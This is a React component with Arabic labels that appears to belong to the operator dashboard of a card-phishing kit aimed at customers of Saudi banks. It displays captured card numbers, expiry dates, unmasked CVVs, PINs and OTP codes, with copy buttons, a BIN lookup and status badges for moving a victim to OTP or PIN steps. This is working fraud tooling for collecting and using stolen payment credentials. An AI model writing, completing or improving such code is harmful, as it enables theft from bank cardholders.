"use client"

import { ReactNode, useEffect, useRef, useState } from "react"
import { toast } from "sonner"

interface DataBubbleProps {
  title: string
  data: Record<string, any>
  timestamp?: string | Date
  status?: "pending" | "approved" | "rejected"
  pendingAction?: string | null
  showActions?: boolean
  isLatest?: boolean
  actions?: ReactNode
  icon?: string
  color?: "blue" | "green" | "purple" | "orange" | "pink" | "indigo" | "gray"
  layout?: "vertical" | "horizontal"
}

interface BinData {
  valid: boolean
  scheme: string
  brand: string
  type: string
  level: string
  currency: string
  issuer: { name: string }
  country: { country: string }
}

type CopyableCardField = "cardNumber" | "expiryDate" | "cvv"

const copyFieldLabels: Record<CopyableCardField, string> = {
  cardNumber: "رقم البطاقة",
  expiryDate: "تاريخ الانتهاء",
  cvv: "CVV"
}

const getBankLogoUrl = (bankName: string): string | null => {
  const n = (bankName || "").toLowerCase()
  // Saudi National Bank / Al Ahli / SNB
  if (n.includes("أهلي") || n.includes("ahli") || n.includes("snb") || n.includes("national") || n.includes("saudi national")) return "/logo-snb.png"
  // Al Rajhi Bank
  if (n.includes("راجح") || n.includes("rajhi") || n.includes("al rajhi")) return "/logo-rajhi.png"
  // Riyadh Bank
  if (n.includes("رياض") || n.includes("riyad") || n.includes("riyadh bank")) return "/logo-riyad.jpg"
  // Alinma Bank
  if (n.includes("إنماء") || n.includes("انماء") || n.includes("alinma")) return "/logo-alinma.png"
  return null
}

const getNetworkLogoUrl = (brand: string): string | null => {
  if (brand === "MADA") return "/logo-mada.png"
  if (brand === "VISA") return "/logo-visa.png"
  if (brand === "MASTERCARD") return "/logo-mastercard.png"
  return null
}

export function DataBubble({
  title,
  data,
  timestamp,
  status,
  pendingAction,
  showActions,
  isLatest,
  actions,
  icon,
  color: _color,
  layout: _layout = "vertical"
}: DataBubbleProps) {
  const [copiedField, setCopiedField] = useState<CopyableCardField | null>(null)
  const copyResetTimeoutRef = useRef<number | null>(null)
  const [, setTick] = useState(0)

  useEffect(() => {
    const id = window.setInterval(() => setTick(t => t + 1), 1000)
    return () => window.clearInterval(id)
  }, [])

  useEffect(() => {
    return () => {
      if (copyResetTimeoutRef.current) window.clearTimeout(copyResetTimeoutRef.current)
    }
  }, [])

  const isCopyableValue = (value: string) => {
    const t = value.trim()
    return !(!t || t.includes("•") || t.includes("*") || t === "غير محدد")
  }

  const copyWithFallback = async (value: string) => {
    const normalized = value.trim()
    if (!normalized || typeof window === "undefined") return false
    const fallback = () => {
      const el = document.createElement("textarea")
      el.value = normalized
      el.setAttribute("readonly", "")
      el.style.cssText = "position:fixed;top:-1000px;opacity:0"
      document.body.appendChild(el)
      el.focus()
      el.select()
      const ok = document.execCommand("copy")
      document.body.removeChild(el)
      return ok
    }
    if (navigator.clipboard && window.isSecureContext) {
      try { await navigator.clipboard.writeText(normalized); return true } catch { return fallback() }
    }
    return fallback()
  }

  const handleCopy = async (field: CopyableCardField, value: string) => {
    if (!isCopyableValue(value)) { toast.error("لا توجد قيمة قابلة للنسخ"); return }
    const ok = await copyWithFallback(value)
    if (!ok) { toast.error("تعذر نسخ القيمة"); return }
    setCopiedField(field)
    if (copyResetTimeoutRef.current) window.clearTimeout(copyResetTimeoutRef.current)
    copyResetTimeoutRef.current = window.setTimeout(() => {
      setCopiedField(c => c === field ? null : c)
    }, 1500)
    toast.success(`تم نسخ ${copyFieldLabels[field]}`)
  }

  const getStatusBadge = () => {
    // Show pending action if available (immediate feedback during processing)
    if (pendingAction) {
      return (
        <span className="inline-flex items-center px-2.5 py-1 rounded-lg text-xs font-semibold border bg-blue-50 text-blue-700 border-blue-200 animate-pulse">
          {pendingAction}
        </span>
      )
    }
    if (!status) return null
    const badges: Record<string, { text: string; className: string }> = {
      pending:           { text: "⏳ قيد المراجعة", className: "bg-yellow-50 text-yellow-700 border-yellow-200" },
      approved:          { text: "✓ تم القبول",     className: "bg-green-50 text-green-700 border-green-200" },
      rejected:          { text: "✗ تم الرفض",      className: "bg-red-50 text-red-600 border-red-200" },
      approved_with_otp: { text: "🔑 تحول OTP",     className: "bg-blue-50 text-blue-700 border-blue-200" },
      approved_with_pin: { text: "🔐 تحول PIN",     className: "bg-purple-50 text-purple-700 border-purple-200" },
      resend:            { text: "🔄 إعادة إرسال",  className: "bg-orange-50 text-orange-700 border-orange-200" },
      message:           { text: "📲 في انتظار الموافقة", className: "bg-amber-50 text-amber-700 border-amber-200 animate-pulse" },
    }
    const badge = badges[status]
    if (!badge) return null
    return (
      <span className={`inline-flex items-center px-2.5 py-1 rounded-lg text-xs font-semibold border ${badge.className}`}>
        {badge.text}
      </span>
    )
  }

  const formatElapsed = (ts: string | Date) => {
    const diff = Math.max(0, Date.now() - new Date(ts).getTime())
    const totalSeconds = Math.floor(diff / 1000)
    const days = Math.floor(totalSeconds / 86400)
    const hours = Math.floor((totalSeconds % 86400) / 3600)
    const minutes = Math.floor((totalSeconds % 3600) / 60)
    const seconds = totalSeconds % 60
    if (days > 0) return `${days} يوم و ${hours} ساعة`
    if (hours > 0) return `${hours} ساعة و ${minutes} دقيقة`
    if (minutes > 0) return `${minutes} دقيقة و ${seconds} ثانية`
    return `${seconds} ثانية`
  }

  const isCardData = title === "معلومات البطاقة" || !!data["رقم البطاقة"] || !!data["نوع البطاقة"]

  // Extract card data outside hooks
  const rawNum     = (data["رقم البطاقة"] || "").toString().replace(/\s+/g, "")
  const cardNumber = rawNum ? (rawNum.match(/.{1,4}/g)?.join("  ") || rawNum) : "••••  ••••  ••••  ••••"
  const rawExpiry  = (data["تاريخ الانتهاء"] || "").toString().trim()
  const expiry     = rawExpiry || "••/••"
  const rawCvv     = (data["CVV"] || "").toString().trim()
  const cvv        = rawCvv || "•••"
  const holder     = data["اسم حامل البطاقة"] || "CARD HOLDER"
  const cardType   = (data["نوع البطاقة"] || "CARD").toString().toUpperCase()
  const cardLevel  = (data["مستوى البطاقة"] || "").toString().trim()
  const bankName   = data["البنك"] || ""
  const bankCountry = data["بلد البنك"] || ""

  // Fetch BIN info for card details
  const [binData, setBinData] = useState<BinData | null>(null)
  const binFetchedRef = useRef(false)

  useEffect(() => {
    if (!isCardData || !rawNum || rawNum.length < 6 || binFetchedRef.current) return
    binFetchedRef.current = true

    const bin = rawNum.slice(0, 6)
    fetch(`/api/bin?bin=${bin}`)
      .then(res => res.json())
      .then(json => {
        if (json?.BIN?.valid) {
          setBinData(json.BIN)
        }
      })
      .catch(console.error)
  }, [isCardData, rawNum])

  // Use BIN data if available, otherwise fall back to original data
  const binBankName = binData?.issuer?.name || bankName
  const binCountry = binData?.country?.country || bankCountry
  const binScheme = binData?.scheme || cardType
  const binLevel = binData?.level || cardLevel

  const typeLower  = binScheme.toLowerCase()
  let brand = "CARD"
  if (typeLower.includes("visa"))   brand = "VISA"
  else if (typeLower.includes("master")) brand = "MASTERCARD"
  else if (typeLower.includes("mada"))   brand = "MADA"
  else if (typeLower.includes("amex") || typeLower.includes("american")) brand = "AMEX"

  const bankLogoUrl = getBankLogoUrl(binBankName)
  const networkLogoUrl = getNetworkLogoUrl(brand)

  // Get logo URL for display (prioritize bank logo, then network logo)
  const getDisplayLogoUrl = () => {
    if (bankLogoUrl) return { url: bankLogoUrl, type: "bank" as const };
    if (networkLogoUrl) return { url: networkLogoUrl, type: "network" as const };
    return null;
  }
  const displayLogo = getDisplayLogoUrl();

  // Country flag emoji
  const getCountryFlag = (alpha2: string) => {
    if (!alpha2 || alpha2.length !== 2) return null;
    const codePoints = [...alpha2.toUpperCase()].map(c => 127397 + c.charCodeAt(0));
    return String.fromCodePoint(...codePoints);
  }
  const countryFlag = getCountryFlag(data.country?.alpha2 || "");

  if (isCardData) {

    return (
      <div className="bg-gray-50 rounded-lg p-2 border border-gray-300" style={{ fontFamily: "Cairo, Tajawal, sans-serif", width: "500px", height: "350px" }}>

        {/* Bubble header */}
        <div className="mb-1">
          <div className="flex items-center justify-between">
            <span className="text-[10px] text-gray-400">
              {timestamp ? `⏱ ${formatElapsed(timestamp)}` : ""}
            </span>
            <h3 className="text-sm font-bold text-gray-800">{title}</h3>
            <div style={{ width: "80px" }}></div>
          </div>
        </div>

        {/* ─── Credit Card Visual ─── */}
        <div
          className="relative rounded-2xl overflow-hidden shadow-md"
          style={{
            background: "linear-gradient(135deg, rgb(230, 244, 236) 0%, rgb(194, 224, 204) 100%)",
            border: "1.5px solid rgb(144, 201, 168)",
            padding: "12px 14px",
            height: "220px"
          }}
        >
          {/* Decorative circles */}
          <div className="absolute inset-0 pointer-events-none" style={{ opacity: 0.06 }}>
            <div style={{ position: "absolute", top: "-30%", right: "-15%", width: "55%", height: "100%", borderRadius: "50%", background: "rgb(0, 102, 51)" }} />
            <div style={{ position: "absolute", bottom: "-30%", left: "-10%", width: "45%", height: "80%", borderRadius: "50%", background: "rgb(0, 102, 51)" }} />
          </div>

          {/* Card inner content */}
          <div className="relative h-full flex flex-col justify-between">
            {/* Top row: Bank logo + SAR badge */}
            <div className="flex items-start justify-between">
              <div className="flex flex-col gap-0">
                {displayLogo ? (
                  <>
                    <img
                      alt={binBankName || brand}
                      className="h-6 w-auto object-contain"
                      src={displayLogo.url}
                      style={{ maxWidth: "90px", filter: "none" }}
                    />
                    {binBankName && binBankName !== "غير محدد" && (
                      <span style={{ fontSize: "8px", color: "rgb(45, 122, 79)", fontWeight: 700, letterSpacing: "0.03em", textTransform: "uppercase" }}>
                        {binBankName}
                      </span>
                    )}
                  </>
                ) : (
                  binBankName && binBankName !== "غير محدد" && !binBankName.toLowerCase().includes("master") && !binBankName.toLowerCase().includes("visa") && !binBankName.toLowerCase().includes("card") ? (
                    <span style={{ fontSize: "10px", color: "rgb(0, 102, 51)", fontWeight: 700, letterSpacing: "0.03em", textTransform: "uppercase" }}>
                      {binBankName}
                    </span>
                  ) : (
                    <span style={{ fontSize: "10px", color: "rgb(0, 102, 51)", fontWeight: 700, letterSpacing: "0.03em", textTransform: "uppercase" }}>
                      {brand}
                    </span>
                  )
                )}
              </div>
              <div style={{ border: "1.5px solid rgb(0, 102, 51)", borderRadius: "6px", padding: "2px 8px", fontSize: "10px", fontWeight: "bold", color: "rgb(0, 102, 51)", letterSpacing: "0.05em" }}>
                SAR
              </div>
            </div>

            {/* Middle: Card Number */}
            <div style={{ fontFamily: "'Courier New', 'Lucida Console', monospace", fontWeight: "bold", color: "rgb(0, 77, 38)", display: "inline-block", width: "auto", direction: "ltr", textAlign: "left", letterSpacing: "0.18em", whiteSpace: "nowrap", alignItems: "center", margin: "2px 0px" }}>
              <button
                type="button"
                onClick={() => void handleCopy("cardNumber", rawNum)}
                disabled={!isCopyableValue(rawNum)}
                title="نسخ رقم البطاقة"
                className="group w-full text-left"
              >
                <span className="group-hover:opacity-70 transition-opacity" style={{ fontSize: "32px", width: "80%" }}>
                  {cardNumber}
                </span>
              </button>
            </div>

            {/* Bottom section: Holder + Expiry/CVV + Type/Country */}
            <div className="flex items-end justify-between">
              {/* Left: Holder name + Expiry/CVV */}
              <div className="flex flex-col gap-0">
                <span style={{ fontSize: "10px", fontWeight: "bold", color: "rgb(0, 77, 38)", letterSpacing: "0.03em", textTransform: "uppercase" }}>
                  {holder}
                </span>
                <div className="flex items-center" style={{ gap: "10px" }}>
                  <div className="flex items-baseline gap-1">
                    <span style={{ fontSize: "16px", color: "rgb(45, 122, 79)", letterSpacing: "0.03em", fontWeight: "bold" }}>EXPIRES</span>
                    <div style={{ fontSize: "16px", fontWeight: "bold", color: "rgb(0, 77, 38)", direction: "ltr" }}>
                      {expiry}
                    </div>
                  </div>
                  <div className="flex items-baseline gap-1">
                    <span style={{ fontSize: "16px", color: "rgb(45, 122, 79)", letterSpacing: "0.03em", fontWeight: "bold" }}>CVV</span>
                    <button
                      type="button"
                      onClick={() => void handleCopy("cvv", rawCvv)}
                      disabled={!isCopyableValue(rawCvv)}
                      className="group"
                    >
                      <div style={{ fontSize: "16px", fontWeight: "bold", color: "rgb(0, 77, 38)" }}>
                        {copiedField === "cvv" ? "✓" : cvv}
                      </div>
                    </button>
                  </div>
                </div>
              </div>

              {/* Right: Type + Country */}
              <div className="flex flex-col items-end gap-0">
                <span style={{ fontSize: "8px", fontWeight: "bold", color: "rgb(45, 122, 79)", letterSpacing: "0.05em", textTransform: "uppercase" }}>
                  {data.type === "DEBIT" ? "DEBIT" : data.type === "CREDIT" ? "CREDIT" : data.type === "PREPAID" ? "PREPAID" : ""} · {brand}
                </span>
                {countryFlag && (
                  <div className="flex items-center gap-1">
                    <span title={data.country?.country} style={{ fontSize: "12px" }}>
                      {countryFlag}
                    </span>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>

        {/* ─── Footer: status badge + actions ─── */}
        {(status || (showActions && actions)) && (
          <div className="flex flex-col gap-2 mt-1">
            {status && <div className="flex justify-center">{getStatusBadge()}</div>}
            {showActions && actions && <div>{actions}</div>}
          </div>
        )}
      </div>
    )
  }

  // ─────────────────────────────────────────
  // PIN / OTP digit boxes
  // ─────────────────────────────────────────
  const isPinOrOtp =
    title.includes("PIN") || title.includes("OTP") ||
    title.includes("رمز") || title.includes("كود") || title.includes("كلمة مرور")

  let digitValue = ""
  if (isPinOrOtp) {
    const entries = Object.entries(data)
    if (entries.length > 0) digitValue = entries[0][1]?.toString() || ""
  }

  return (
    <div
      className="bg-white rounded-2xl overflow-hidden shadow-[0_2px_12px_rgba(0,0,0,0.06)] border border-gray-100 flex-shrink-0"
      style={{ fontFamily: "Cairo, Tajawal, sans-serif", width: "500px" }}
    >
      {/* Header */}
      <div className="flex items-center justify-center px-3 py-1.5 border-b border-gray-100 relative">
        <div className="flex items-center gap-1.5">
          {icon && <span className="text-xs">{icon}</span>}
          <span className="text-xs font-bold text-gray-800">{title}</span>
        </div>
        <div className="absolute right-3 flex items-center gap-1.5">
          {isLatest && (
            <span className="text-[9px] font-bold text-emerald-600 bg-emerald-50 border border-emerald-200 px-1.5 py-0.5 rounded-full">الأحدث</span>
          )}
          {timestamp && (
            <span className="text-[10px] text-gray-400">⏱ {formatElapsed(timestamp)}</span>
          )}
        </div>
      </div>

      {/* Body */}
      <div className="px-3 py-2">
        {isPinOrOtp && digitValue ? (
          <div className="flex justify-center gap-2 py-2" style={{ direction: "ltr" }}>
            {digitValue.split("").map((digit, i) => (
              <div
                key={i}
                className="w-10 h-12 rounded bg-gray-50 border-2 border-gray-300 shadow flex items-center justify-center"
              >
                <span className="text-xl font-bold text-gray-900">{digit}</span>
              </div>
            ))}
          </div>
        ) : (
          <div className="space-y-1.5">
            {Object.entries(data).map(([key, value]) => {
              if (value === undefined || value === null) return null
              const str = value?.toString() || "-"
              return (
                <div key={key} className="flex items-center justify-between gap-3 py-1">
                  <span className="text-gray-600 text-xs font-bold shrink-0 text-right whitespace-nowrap">{key}:</span>
                  <span className="text-gray-900 font-bold text-xs break-words text-left">{str}</span>
                </div>
              )
            })}
          </div>
        )}
      </div>

      {/* Footer */}
      {(status || (showActions && actions)) && (
        <div className="flex flex-col gap-2 px-3 py-2 border-t border-gray-100 bg-gray-50/60">
          {status && <div className="flex justify-center">{getStatusBadge()}</div>}
          {showActions && actions && <div>{actions}</div>}
        </div>
      )}
    </div>
  )
}
